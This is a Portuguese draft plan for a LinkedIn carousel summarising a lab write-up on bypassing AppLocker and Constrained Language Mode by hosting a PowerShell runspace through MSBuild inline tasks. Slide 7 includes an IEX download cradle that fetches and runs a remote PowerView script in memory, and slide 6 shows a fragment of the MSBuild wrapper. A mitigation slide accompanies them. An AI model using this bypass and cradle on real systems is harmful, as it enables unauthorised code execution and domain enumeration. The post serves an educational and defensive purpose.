# Carrossel LinkedIn — Bypass de AppLocker + Constrained Language Mode

**Write-up de origem:** `writeups/applocker-clm-bypass.html`
**Link (vai só no primeiro comentário):** https://lucasralbino.github.io/writeups/applocker-clm-bypass.html
**Público-alvo:** recrutadores de segurança ofensiva, tech leads, gestores de Red Team / Blue Team.
**Tom:** técnico, direto, sem hype. Quem entende reconhece a técnica; quem não entende, entende o raciocínio.

**Formato:** 8 slides, 1080x1350 (4:5). Terminal escuro, fonte mono (JetBrains Mono / IBM Plex Mono),
acento em verde-terminal, no mesmo visual do portfólio. Título grande, no máximo ~40 palavras por slide.

---

## Slide 1 — Capa

**Título:**
Duas defesas do Windows caíram sem explorar um único bug.

**Corpo:**
AppLocker + Constrained Language Mode, contornados por design — não por vulnerabilidade.
Um LOLBIN assinado pela Microsoft fez o trabalho.

**Rodapé:** `Red Team · Windows · Active Directory — write-up completo nos comentários`

**Visual:** fundo terminal. No canto, o prompt:
`PS> $ExecutionContext.SessionState.LanguageMode`
`ConstrainedLanguage`

---

## Slide 2 — O cenário

**Título:**
O alvo

**Corpo:**
Workstation em domínio, laboratório próprio e isolado.
Duas camadas de contenção ativas:

- **AppLocker** — restringe *de onde* binários e scripts podem rodar.
- **Constrained Language Mode (CLM)** — restringe *o que* o PowerShell consegue fazer.

Objetivo: carregar o PowerView **em memória** e enumerar o AD. Em disco, o Defender flagra o
conteúdo e o AppLocker joga o script em CLM.

**Visual:** diagrama simples das duas barreiras entre "shell" e "PowerView".

---

## Slide 3 — A parede

**Título:**
O download cradle clássico morre na primeira linha

**Corpo:**
```powershell
$browser = New-Object System.Net.WebClient
# PSNotSupportedException: CannotCreateTypeConstrainedLanguage
```

Em CLM o PowerShell aceita só os core types. Sem `New-Object` para tipos .NET arbitrários,
sem chamada direta a métodos .NET, sem `Add-Type`, sem COM.

É a contenção que a Microsoft acopla ao AppLocker/WDAC: mesmo com shell aberta,
o atacante fica sem as primitivas que quase toda ferramenta ofensiva pressupõe.

**Visual:** print do erro — `assets/img/applocker/02-newobject-clm.png`.

---

## Slide 4 — Ler a política antes de atacá-la

**Título:**
Onde a política de fato permite execução

**Corpo:**
```powershell
Import-Module AppLocker
$a = Get-AppLockerPolicy -Effective
$a.RuleCollections
```

O host roda as **default rules**: `Everyone` pode executar qualquer coisa sob
`%PROGRAMFILES%` e `%WINDIR%`.

Parece seguro — usuário comum não escreve nesses diretórios.
Só que `%WINDIR%` guarda binários assinados que **executam código por nós**.

**Visual:** print das regras — `assets/img/applocker/04-applocker-rules.png`.

---

## Slide 5 — O insight

**Título:**
O CLM vive no host — e o AppLocker não alcança o seu host

**Corpo:**
Duas caixas:

1. `sessão interativa` → **ConstrainedLanguage**
2. `host próprio (lançado por binário confiável)` → `runspace novo` → **FullLanguage**

O AppLocker impõe o CLM, mas **não o propaga para um runspace criado em um host próprio**.
Um binário confiável (MSBuild) hospeda esse runspace, e ele nasce em Full Language.
**Sob WDAC, isso não passa.**

**Visual:** slide de virada. A frase do título em destaque, o diagrama abaixo.

---

## Slide 6 — O veículo

**Título:**
MSBuild.exe: assinado, confiável e compila C# inline

**Corpo:**
Mora em `%WINDIR%` (logo, permitido pelo AppLocker) e executa *inline tasks*.
O wrapper é um XML de aparência inofensiva — extensão `.txt`, porque o AppLocker
avalia **o binário que lança**, não o conteúdo do texto.

```xml
<UsingTask TaskName="PsCommand" TaskFactory="CodeTaskFactory"
  AssemblyFile="...\Microsoft.Build.Tasks.v4.0.dll">
  <Task><Reference Include="System.Management.Automation"/>
```

```
.\MSBuild.exe C:\Users\...\Downloads\dunga.txt
```

**Visual:** trecho do XML + a linha de execução.

---

## Slide 7 — O resultado

**Título:**
FullLanguage de volta — e o AD aberto

**Corpo:**
O runspace criado pela DLL responde `FullLanguage`. Com isso, `New-Object` volta a funcionar
e o PowerView entra **direto em memória**, sem tocar o disco:

```powershell
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString('http://.../miniview.ps1'))
Get-NetUser | Select name, description
```

Bônus clássico de AD real: uma **senha em texto claro no campo `description`** do LDAP.

Correção do lado defensivo: senha nunca no campo `description`; auditar o atributo.

**Visual:** print do console em FullLanguage + saída do `Get-NetUser`, com dados mascarados.

---

## Slide 8 — Do lado azul

**Título:**
O que efetivamente quebra essa cadeia

**Corpo:**
- **WDAC com regras de DLL** — alcança o runspace que o AppLocker não alcança. Mitigação central.
- **Bloquear/auditar `MSBuild.exe`**, `InstallUtil`, `csc` em estações que não compilam código.
- **Ativar a coleção de regras de DLL do AppLocker** — força o `System.Management.Automation.dll`
  a passar por regra (vem desligada por padrão).
- **Script Block Logging (4104) + AMSI** — runspace e carregamento ficam registrados,
  mesmo em memória.
- **Regras de publisher ou hash** — no lugar da confiança em uma árvore inteira de binários.

**Rodapé:** `Write-up completo no primeiro comentário ↓`

---

# Legenda do post

Duas defesas sérias do Windows caíram no meu lab sem que eu explorasse uma única vulnerabilidade.

O cenário: workstation em domínio, **AppLocker** restringindo de onde o código roda e
**Constrained Language Mode** restringindo o que o PowerShell consegue fazer.
O objetivo: carregar o PowerView em memória e enumerar o Active Directory.

A primeira linha do download cradle já morre — em CLM, `New-Object System.Net.WebClient`
lança `CannotCreateTypeConstrainedLanguage`. Sem tipos .NET arbitrários, sem `Add-Type`, sem COM.

O caminho não foi um exploit. Foram dois fatos de design se encontrando:

1. O Constrained Language Mode vive no **host** do PowerShell. O AppLocker impõe o CLM,
   mas não o propaga para um runspace criado dentro de um host próprio — quem propagaria
   é o WDAC.
2. As **default rules** do AppLocker liberam a árvore inteira de `%WINDIR%`.
   E `%WINDIR%` guarda binários assinados que executam código por nós.

Junte os dois: `MSBuild.exe` compila C# inline, está assinado pela Microsoft e mora em `%WINDIR%`.
Ele hospeda o runspace novo, que nasce em Full Language. O AppLocker aprova o lançador e não
alcança o host criado. Dali em diante, PowerView em memória — e uma senha em texto claro no
campo `description` de um objeto do AD.

A lição para quem defende: **defesa em profundidade cai quando uma das camadas confia
em uma árvore inteira de binários.** A mitigação central é WDAC com regras de DLL, que alcança
o runspace que o AppLocker não alcança. Somam-se a ativação da coleção de regras de DLL do
AppLocker (vem desligada por padrão), auditoria de `MSBuild`/`InstallUtil`/`csc` em estações que
não compilam código, Script Block Logging (4104) e regras de publisher no lugar das default rules.

Escrevi o passo a passo — com os erros, os prints e a seção de detecção e mitigação.
Link no primeiro comentário.

Laboratório próprio e isolado, domínio e dados fictícios, reproduzindo o cenário do livro
*How to Hack Like a Legend: Breaking Windows*, do Sparc Flow. Estritamente educacional.

#RedTeam #ActiveDirectory #AppLocker #PowerShell #Pentest #WindowsSecurity #BlueTeam #Cibersegurança

---

# Primeiro comentário

Write-up completo, com os prints, o XML do wrapper e a seção de detecção e mitigação:
https://lucasralbino.github.io/writeups/applocker-clm-bypass.html

Créditos da técnica e do console interativo ao **Sparc Flow**, em
*How to Hack Like a Legend: Breaking Windows* — o lab reproduz o cenário do livro.

Referências que valem a leitura:
• sparcflow/HackLikeALegend — `msbuild/psh.xml` e `msbuild/console.xml`
• api0cradle/UltimateAppLockerByPassList
• Hacking Articles — Bypassing WDAC and AppLocker / AppLocker Policy: A Beginner's Guide

---

## Notas de publicação

- **Link só no primeiro comentário** — a legenda não leva URL, para não penalizar o alcance.
  Comente imediatamente após publicar e fixe o comentário.
- **Melhor janela:** terça a quinta, 8h–10h (BRT).
- **Mascarar** hostnames, IPs internos, nomes de usuário e a senha do `description` nos prints.
- O slide 5 é o gancho de compartilhamento — se algum slide for reescrito, mantenha esse intacto.
- Se um recrutador comentar, responda pela seção de mitigação: mostra raciocínio ofensivo
  **e** defensivo, que é o que tech lead procura.
